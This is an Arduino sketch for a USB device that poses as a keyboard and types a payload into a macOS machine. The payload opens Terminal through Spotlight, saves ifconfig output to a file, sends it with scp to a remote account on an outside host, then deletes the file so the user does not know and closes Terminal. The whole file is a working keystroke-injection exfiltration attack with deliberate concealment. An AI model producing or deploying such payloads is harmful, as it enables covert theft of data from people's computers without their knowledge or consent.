#include <HID-Project.h>
#include <HID-Settings.h>

void setup()
{
    // Start Keyboard
  Keyboard.begin();

  // Start Payload
  delay(3000);
  
  // Open spotlight search
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(3000);

  // Open terminal from Spotlight search
  Keyboard.print("terminal");
  delay(3000);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(3000);

  Keyboard.print("ifconfig > intscan.txt");

  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(1000);

  Keyboard.print("scp intscan.txt z5117148@cse.unsw.edu.au:~/Documents");

  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(10000);

  // Delete this files so the user doesn't know
  Keyboard.print("rm intscan.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(200);

  // Quit terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(113);
  Keyboard.releaseAll();
  // End Payload

  // Stop Keyboard
  Keyboard.end();
}

// Unused
void loop() {}
